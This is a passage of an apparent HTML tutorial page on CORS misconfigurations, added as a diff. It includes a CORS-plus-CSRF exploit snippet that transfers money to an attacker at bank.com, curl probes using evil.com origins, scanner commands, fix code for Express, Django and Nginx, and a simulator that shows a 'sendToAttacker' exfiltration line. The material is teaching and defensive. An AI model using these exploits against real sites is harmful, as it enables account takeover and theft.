@@ -1,0 +1,291 @@
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Chained exploit — CORS + XSS for full account takeover</div>
+    <div class="code">// Step 1: CORS reads CSRF token from account page
+fetch('https://bank.com/account', {credentials: 'include'})
+  .then(r => r.text())
+  .then(html => {
+    // Extract CSRF token from the HTML
+    const token = html.match(/csrf_token['"]\s*value=['"](.*?)['"]/)[1];
+
+    // Step 2: Use CSRF token to perform state-changing action
+    return fetch('https://bank.com/transfer', {
+      method: 'POST',
+      credentials: 'include',
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body: `to=attacker&amount=10000&csrf_token=${token}`
+    });
+  });
+// CORS misconfiguration bypasses CSRF protection entirely!
+// By reading the CSRF token cross-origin, then using it.</div>
+  </div>
+
+  <div class="sc-card sc-amber">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Subdomain takeover amplifies CORS impact</div>
+    <div class="code">// If CORS allows *.bank.com and you take over old.bank.com:
+Access-Control-Allow-Origin: https://old.bank.com  ← your page!
+Access-Control-Allow-Credentials: true
+
+// Serve your exploit from old.bank.com → browser trusts it
+// Browser sends: Origin: https://old.bank.com → allowed → read response
+
+// Also: if CORS allows subdomains and one subdomain has XSS:
+// XSS on docs.bank.com can read api.bank.com responses
+// because Origin: https://docs.bank.com is allowed</div>
+  </div>
+</div>
+
+<!-- TESTING -->
+<div class="tab-panel" id="tab-test">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">A systematic approach to finding CORS misconfigurations in black-box and grey-box testing.</p>
+
+  <div class="sc-card sc-blue" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Step 1 — Find endpoints that return sensitive data</div>
+    <div class="code"># Target endpoints with auth data, PII, or tokens:
+GET /api/v1/user/profile
+GET /api/v1/account/balance
+GET /api/v1/admin/users
+GET /dashboard/data
+
+# Check if they require authentication (non-200 without session)</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Step 2 — Send test Origin headers</div>
+    <div class="code"># Test 1: arbitrary origin
+curl -H "Origin: https://evil.com" \
+     -H "Cookie: session=YOUR_TOKEN" \
+     -I https://api.target.com/user/profile
+# Vulnerable if response contains:
+# Access-Control-Allow-Origin: https://evil.com
+# Access-Control-Allow-Credentials: true
+
+# Test 2: null origin
+curl -H "Origin: null" -H "Cookie: session=TOKEN" -I https://api.target.com/user
+
+# Test 3: suffix bypass
+curl -H "Origin: https://target.com.evil.com" -H "Cookie: session=TOKEN" -I https://api.target.com/user
+
+# Test 4: subdomain
+curl -H "Origin: https://evil.target.com" -H "Cookie: session=TOKEN" -I https://api.target.com/user
+
+# Automate all tests:
+for origin in "https://evil.com" "null" "https://target.com.evil.com" "https://eviltarget.com" "https://evil.target.com"; do
+  echo -n "$origin: "
+  curl -s -H "Origin: $origin" -H "Cookie: session=TOKEN" -I https://api.target.com/user \
+    | grep -i "access-control"
+done</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Step 3 — Confirm exploitability (must have ACAC: true)</div>
+    <div class="code"># A misconfigured ACAO alone is only exploitable if:
+# 1. ACAC: true is also set (for cookie auth), OR
+# 2. The endpoint uses token auth and token is accessible to attacker JS
+
+# NOT exploitable (browser blocks):
+Access-Control-Allow-Origin: https://evil.com
+# (no Access-Control-Allow-Credentials header)
+# → Browser allows the request but NOT the read if cookies were needed
+
+# EXPLOITABLE:
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true
+# → Both cookies AND response body accessible cross-origin
+
+# Test exploitability: create a PoC page on your own domain
+# and verify the fetch() actually returns data</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Automated scanning</div>
+    <div class="code"># CORScanner
+python3 cors_scanner.py -u https://api.target.com -l endpoints.txt
+
+# corsy
+python3 corsy.py -u https://api.target.com -t 10 --headers "Cookie: session=TOKEN"
+
+# Burp Suite Active Scanner — checks for CORS misconfigs automatically
+# Burp extension: CORS* (checks all enumerated endpoints)
+
+# Manual Burp approach:
+# Intercept authenticated request → add Origin: evil.com header
+# Check response for ACAO header → match?</div>
+  </div>
+</div>
+
+<!-- FIXES -->
+<div class="tab-panel" id="tab-fix">
+
+  <div class="fix-card danger">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9312; Use a strict allowlist — never reflect the Origin header <span class="badge b-red">Root fix</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Maintain an explicit list of trusted origins. Only set ACAO to an exact match from the list. Never set ACAO to the value of the incoming Origin header without checking it.</div>
+    <div class="code">## Node.js / Express
+const ALLOWED_ORIGINS = new Set([
+  'https://app.bank.com',
+  'https://bank.com'
+]);
+
+app.use((req, res, next) => {
+  const origin = req.headers.origin;
+  if (ALLOWED_ORIGINS.has(origin)) {
+    res.header('Access-Control-Allow-Origin', origin);
+    res.header('Access-Control-Allow-Credentials', 'true');
+    res.header('Vary', 'Origin');  // ← important for caching
+  }
+  // If not in allowlist: no CORS headers → browser blocks
+  next();
+});
+
+## Python / Django (django-cors-headers)
+CORS_ALLOWED_ORIGINS = [
+    "https://app.bank.com",
+    "https://bank.com",
+]
+CORS_ALLOW_CREDENTIALS = True
+# Never use CORS_ORIGIN_ALLOW_ALL = True with credentials
+
+## Nginx
+if ($http_origin ~* "^https://(app\.)?bank\.com$") {
+    add_header Access-Control-Allow-Origin $http_origin always;
+    add_header Access-Control-Allow-Credentials true always;
+    add_header Vary Origin always;
+}</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9313; Never allow null origin in production <span class="badge b-green">Essential</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">The null origin is used by sandboxed iframes and local files — legitimate applications should never need to accept it. Remove it from any allowlist.</div>
+    <div class="code">## Bad — never do this:
+if (origin === 'null' || !origin) {
+  res.header('Access-Control-Allow-Origin', 'null');
+  res.header('Access-Control-Allow-Credentials', 'true');
+}
+
+## Good — simply don't include null in the allowlist
+const ALLOWED_ORIGINS = new Set(['https://app.bank.com']);
+// null will never match → no CORS headers set → blocked</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9314; Add the Vary: Origin header <span class="badge b-green">Required with dynamic ACAO</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">If ACAO varies per request (dynamic allowlist), you MUST set <code style="font-family:'Courier New',monospace;font-size:11px">Vary: Origin</code>. Without it, a CDN/proxy caches the first response with one ACAO value and serves it to all subsequent requests — potentially returning a response with the wrong origin allowed.</div>
+    <div class="code">## Always include when ACAO is dynamic:
+res.header('Vary', 'Origin');
+
+## Example problem without Vary:
+# Request 1: Origin: https://app.bank.com → ACAO: https://app.bank.com (cached)
+# Request 2: Origin: https://evil.com → CDN serves cached response
+#            → ACAO: https://app.bank.com in cached response
+#            → Actually SAFE here, but logic is broken
+
+## Another problem: CDN caches ACAO: evil.com (if misconfigured)
+# → All users receive that cached header → mass exploitation</div>
+  </div>
+
+  <div class="fix-card warn">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9315; Wildcard * — safe only for truly public data <span class="badge b-amber">Know when it's OK</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;"><code style="font-family:'Courier New',monospace;font-size:11px">Access-Control-Allow-Origin: *</code> is safe for public, unauthenticated endpoints (public CDN assets, public APIs with no user data). Never use wildcard with credentials or on authenticated endpoints.</div>
+    <div class="code">## Safe use of wildcard:
+# Public font/asset CDN
+Access-Control-Allow-Origin: *
+# Public API returning non-user-specific data
+Access-Control-Allow-Origin: *
+
+## NEVER:
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true   ← browsers block this anyway, but signals bad intent
+
+## NEVER on authenticated endpoints:
+GET /api/user/account  → Access-Control-Allow-Origin: *  ← wrong</div>
+  </div>
+
+  <div class="fix-card info">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9316; Checklist</div>
+    <div style="font-size:12px;color:#888;line-height:1.9;">
+      Maintain an explicit origin allowlist — never reflect the Origin header verbatim &nbsp;·&nbsp;
+      Use exact string matching — no substring, suffix, or regex match on origin &nbsp;·&nbsp;
+      Never add <code style="font-family:'Courier New',monospace">null</code> to the allowlist &nbsp;·&nbsp;
+      Always set <code style="font-family:'Courier New',monospace">Vary: Origin</code> when using a dynamic allowlist &nbsp;·&nbsp;
+      Never combine <code style="font-family:'Courier New',monospace">*</code> with <code style="font-family:'Courier New',monospace">Allow-Credentials: true</code> &nbsp;·&nbsp;
+      Audit all API endpoints — not just main app routes &nbsp;·&nbsp;
+      Third-party libraries may set permissive CORS defaults — always review
+    </div>
+  </div>
+</div>
+
+<script>
+function showTab(id,btn){
+  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tab-'+id).classList.add('active');
+  btn.classList.add('active');
+}
+
+function setO(v){
+  document.getElementById('origin-input').value=v;
+  runCors();
+}
+
+function runCors(){
+  const origin = document.getElementById('origin-input').value.trim();
+  const policy = document.getElementById('policy-select').value;
+  const exOut = document.getElementById('exchange-out');
+  const brOut = document.getElementById('browser-out');
+  const jsOut = document.getElementById('js-out');
+  const verd = document.getElementById('verdict');
+
+  const legitimateOrigins = new Set(['https://app.bank.com','https://bank.com']);
+  let acao='', acac='', exploitable=false, reason='';
+
+  if(policy==='reflect'){
+    acao=origin; acac='true'; exploitable=true;
+    reason='Server reflects any Origin with credentials=true — any site in the world can read authenticated responses.';
+  } else if(policy==='reflect_check'){
+    const bypass = origin.includes('bank.com') || origin.endsWith('bank.com');
+    if(bypass){ acao=origin; acac='true'; exploitable=true; reason='Weak suffix/contains check bypassed. "bank.com.evil.com" or "evilbank.com" contains "bank.com" → allowed.'; }
+    else { acao=''; acac=''; exploitable=false; reason='Origin did not match the (weak) check — try "https://bank.com.evil.com" or "https://evilbank.com".'; }
+  } else if(policy==='null'){
+    if(origin==='null'){ acao='null'; acac='true'; exploitable=true; reason='Null origin allowed with credentials. Any sandboxed iframe can read authenticated responses.'; }
+    else { acao='https://bank.com'; acac='true'; exploitable=false; reason='Not a null origin. Try the preset "null" to trigger this misconfiguration.'; }
+  } else if(policy==='wildcard'){
+    acao='*'; acac=''; exploitable=false;
+    reason='Wildcard with no credentials. Cannot combine * with credentials:include — browser blocks it. Only a risk for token-auth APIs.';
+  } else if(policy==='strict'){
+    if(legitimateOrigins.has(origin)){ acao=origin; acac='true'; exploitable=false; reason='Origin is in the explicit allowlist — correctly allowed. Attacker cannot spoof this.'; }
+    else { acao=''; acac=''; exploitable=false; reason='Origin not in allowlist. No CORS headers returned — browser blocks the cross-origin read. Correct behavior.'; }
+  } else if(policy==='preflight_bad'){
+    acao=origin; acac='true'; exploitable=true;
+    reason='Simple requests (GET, POST with basic content-type) skip the preflight check entirely. Misconfigured ACAO still applies.';
+  }
+
+  const reqHtml = `GET /api/v1/account HTTP/1.1\nHost: api.bank.com\nOrigin: ${origin}\nCookie: session=VICTIM_SESSION\n\n`;
+  const respHtml = acao
+    ? `HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: ${acao}${acac?'\nAccess-Control-Allow-Credentials: '+acac:''}\nVary: Origin\nContent-Type: application/json\n\n{"balance":10000,"account":"1234-5678","email":"victim@bank.com"}`
+    : `HTTP/1.1 200 OK\nContent-Type: application/json\n(No CORS headers — cross-origin read blocked by browser)\n\n{"balance":10000,"account":"1234-5678","email":"victim@bank.com"}`;
+
+  exOut.innerHTML = `<span style="color:#60a5fa">REQUEST:\n${reqHtml}</span><span style="color:${acao?'#f87171':'#4ade80'}">RESPONSE:\n${respHtml}</span>`;
+
+  if(exploitable){
+    brOut.innerHTML = `<span style="color:#f87171">ACAO matches Origin: ${origin}\n${acac?'ACAC: true → cookies included\n':''}\nBrowser ALLOWS cross-origin read\n→ JS on evil.com can read response body!</span>`;
+    jsOut.innerHTML = `<span style="color:#f87171">// Attacker JS succeeds:\nfetch('https://api.bank.com/v1/account', {credentials: 'include'})\n  .then(r => r.json())\n  .then(data => {\n    // STOLEN: ${JSON.stringify({balance:10000,account:'1234-5678',email:'victim@bank.com'})}\n    sendToAttacker(data);\n  });</span>`;
+    verd.className='result-box r-red';
+    verd.innerHTML=`<strong>CORS misconfiguration exploitable!</strong> ${reason}`;
+  } else if(acao==='*'){
+    brOut.innerHTML=`<span style="color:#fbbf24">ACAO: * (wildcard)\nBrowser BLOCKS credentials with wildcard\n→ No cookies sent → endpoint may still\n   be readable if it uses JS-set tokens</span>`;
+    jsOut.innerHTML=`<span style="color:#fbbf24">fetch('https://api.bank.com/public', {})\n// No credentials:include → works if endpoint\n// returns non-user-specific data\n// → Risk for token-auth APIs</span>`;
+    verd.className='result-box r-amber';
+    verd.innerHTML=`<strong>Wildcard CORS — limited risk.</strong> ${reason}`;
+  } else {
+    brOut.innerHTML=`<span style="color:#4ade80">No ACAO header (or wrong origin)\nBrowser BLOCKS cross-origin read\n\n→ fetch() throws network error\n→ Attacker JS cannot read the response</span>`;
+    jsOut.innerHTML=`<span style="color:#4ade80">// Attacker JS fails:\nfetch('https://api.bank.com/v1/account', {credentials:'include'})\n  .catch(err => {\n    // CORS error — response blocked\n    console.log('Blocked:', err);\n  });</span>`;
+    verd.className='result-box r-green';
+    verd.innerHTML=`<strong>Not exploitable with this origin.</strong> ${reason}`;
+  }
+}
+
+runCors();
+</script>
+</body>
+</html>
